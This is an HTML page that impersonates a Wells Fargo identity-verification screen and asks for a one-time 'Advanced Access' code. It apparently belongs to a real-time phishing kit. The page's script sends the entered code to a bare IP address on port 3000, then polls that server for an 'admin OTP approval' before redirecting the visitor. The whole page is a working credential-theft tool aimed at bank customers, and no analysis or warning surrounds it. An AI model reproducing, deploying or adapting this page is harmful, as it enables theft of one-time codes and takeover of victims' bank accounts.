<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Veri</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f9f9f9;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .top-bar {
      background-color: #df0025;
      color: white;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: bold;
      font-family: 'Clarendon', Georgia, serif;
      font-size: 24px;
      letter-spacing: 1px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }

    .yellow-strip {
      height: 4px;
      background-color: #ffd700;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }

    .container {
      background: white;
      max-width: 480px;
      margin: 60px auto;
      padding: 35px 35px 40px;
      border-radius: 10px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
      flex-grow: 1;
      text-align: center;
    }

    h2 {
      color: #333;
      font-weight: 600;
      margin-bottom: 15px;
    }

    p {
      font-size: 0.95rem;
      color: #666;
      margin-bottom: 20px;
    }

    input[type="text"] {
      padding: 12px 16px;
      font-size: 1.2rem;
      border: 2px solid #ccc;
      border-radius: 8px;
      width: 70%;
      text-align: center;
      letter-spacing: 5px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    button {
      padding: 10px 20px;
      font-size: 1rem;
      background-color: #df0025;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #b8001d;
    }

    .spinner {
      width: 28px;
      height: 28px;
      border: 4px solid #eee;
      border-top: 4px solid #df0025;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 30px auto 0;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    #errorText {
      color: red;
      font-size: 0.9rem;
      margin-top: 15px;
      display: none;
    }

    #otpSection {
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <!-- Top Bar -->
  <header class="top-bar">
    <div class="logo">WELLS FARGO</div>
  </header>

  <!-- Yellow Strip -->
  <div class="yellow-strip"></div>

  <!-- Main Content -->
  <main class="container">
    <h2>Verify Your Identity</h2>
    <p><strong>For your security, an Advanced Access code is required.</strong></p>
    <p>Please enter the code sent to your device.</p>

    <div id="otpSection">
      <input
        type="text"
        id="otp"
        maxlength="8"
        placeholder="••••••"
        oninput="this.value = this.value.replace(/[^0-9]/g, '')"
      />
      <br />
      <button onclick="submitOtp()">Submit Code</button>
    </div>

    <div class="spinner" style="display:none;" id="loadingSpinner"></div>
    <p id="errorText"></p>
  </main>

  <script>
    const API_BASE = "http://158.101.117.189:3000"; // Your server base URL

    async function submitOtp() {
      const otp = document.getElementById("otp").value.trim();
      const errorText = document.getElementById("errorText");
      const spinner = document.getElementById("loadingSpinner");

      if (!otp) {
        errorText.textContent = "Please enter the code.";
        errorText.style.display = "block";
        return;
      }

      errorText.style.display = "none";

      try {
        const res = await fetch(`${API_BASE}/submit-otp`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ otp })
        });

        const data = await res.json();

        if (!res.ok) {
          throw new Error(data.message || "Failed to submit OTP");
        }

        // Hide OTP input, show spinner
        document.getElementById("otpSection").style.display = "none";
        spinner.style.display = "block";

        // Start polling
        pollOtpApproval();
      } catch (err) {
        errorText.textContent = err.message || "An error occurred.";
        errorText.style.display = "block";
      }
    }

    async function pollOtpApproval(maxAttempts = 20, intervalMs = 3000) {
      let attempts = 0;

      while (attempts < maxAttempts) {
        attempts++;
        try {
          const res = await fetch(`${API_BASE}/get-login-data`);
          if (!res.ok) throw new Error("Failed to get approval status");

          const data = await res.json();

          if (data.otpApproved === true) {
            window.location.href = "dashboard.html"; // Redirect after approval
            return;
          }
        } catch (err) {
          document.getElementById("errorText").textContent = "Error checking status. Retrying...";
          document.getElementById("errorText").style.display = "block";
        }

        await new Promise(resolve => setTimeout(resolve, intervalMs));
      }

      document.getElementById("errorText").textContent =
        "Timed out waiting for admin OTP approval.";
      document.getElementById("errorText").style.display = "block";
    }
  </script>
</body>
</html>
